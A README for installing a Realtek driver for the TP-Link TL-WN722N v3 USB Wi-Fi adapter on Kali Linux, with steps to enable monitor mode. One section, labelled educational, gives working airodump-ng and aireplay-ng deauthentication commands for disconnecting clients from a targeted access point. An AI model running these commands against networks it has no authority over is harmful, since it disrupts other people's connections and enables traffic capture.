# tp-link-v3-TL-WN722N
realtek-rtl8188eus-dkms packaging for Kali Linux

## copy  and past the below commands

sudo  apt update

sudo apt dist-upgrade

reboot

sudo apt install linux-headers-$(uname -r) 

sudo apt install bc

sudo rmmod r8188eu.ko

sudo git clone https://github.com/keralahacker/tp-link-v3-usb

cd tp-link-v3-usb

sudo unzip rtl8188eus-hackwithvyshu.zip 


sudo -i

echo "blacklist r8188eu.ko" > "/etc/modprobe.d/realtek.conf"

exit

sudo make

sudo make install

sudo modprobe 8188eu


----------------------------------------------------------------------------------
#### if you face any issues ===> 
https://github.com/keralahacker/tp-link-v3-usb/issues/new 
#### submit with screenshot
----------------------------------------------------------------------------------

## To enable Monitor mode

ifconfig wlan0 down

airmon-ng check kill

iwconfig wlan0 mode monitor

ifconfig wlan0 up

iwconfig                                     \\check mode: monitor



### Deauthentication Attack[for educational purpose only]



airodump-ng wlan0

airodump-ng --bssid <id> --channel <ch> --write test wlan0

aireplay-ng --deauth [any no.] -a <bssid> -c <station id> wlan0


## Important note: 

If after restarting your kali machine doesn't recognise your device..
As lot of people are facing the same problem ..
I have a solution for you..
Whenever you restart your kali OS
Insert the adapter and run the command


sudo rmmod r8188eu.ko

sudo modprobe 8188eu

Disconnect the device and connect again..
